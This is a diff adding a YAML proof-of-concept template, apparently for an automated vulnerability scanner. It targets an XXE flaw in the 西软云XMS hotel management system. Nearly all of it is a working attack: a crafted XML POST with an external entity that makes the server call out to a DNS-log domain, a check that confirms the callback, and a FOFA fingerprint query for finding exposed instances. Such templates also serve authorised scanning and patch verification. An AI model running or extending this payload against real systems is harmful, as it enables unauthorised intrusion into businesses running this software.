@@ -1,0 +1,21 @@
+id: poc-yaml-xi-ruan-yun-futurehotel-operate-xxe
+info:
+  name: 西软云XMS futurehotel-operate XXE漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - xxe
+  - 两高一弱
+  finger: 西软云XMS
+  fofa: app="shiji-西软云XMS"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /XopServerRS/rest/futurehotel/operate
+  headers:
+    Content-Type: text/xml
+  data: <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{.domain}}"> %remote;]>
+  expression: status_code == 500 && reverse.Verify()
+transport: http
